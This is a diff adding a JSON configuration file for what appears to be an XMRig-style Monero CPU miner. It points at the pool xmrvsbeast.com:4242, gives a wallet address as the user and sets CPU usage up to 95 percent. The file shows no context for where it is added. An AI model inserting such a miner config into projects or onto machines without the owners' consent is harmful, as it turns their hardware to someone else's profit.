@@ -1,0 +1,15 @@
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "max-cpu-usage": 95,
+    "pools": [
+        {
+            "url": "xmrvsbeast.com:4242",
+            "user": "458E7mziLH58fSAkwRe7B7LPnEWmeSWEWgcq3UNWjFt5MQFWGUxSpZcPR76H87BaRKRt8aJRCFLupb7iSQeoGBZ7R1yPANg",
+            "keepalive": true,
+            "tls": true
+        }
+    ]
+}
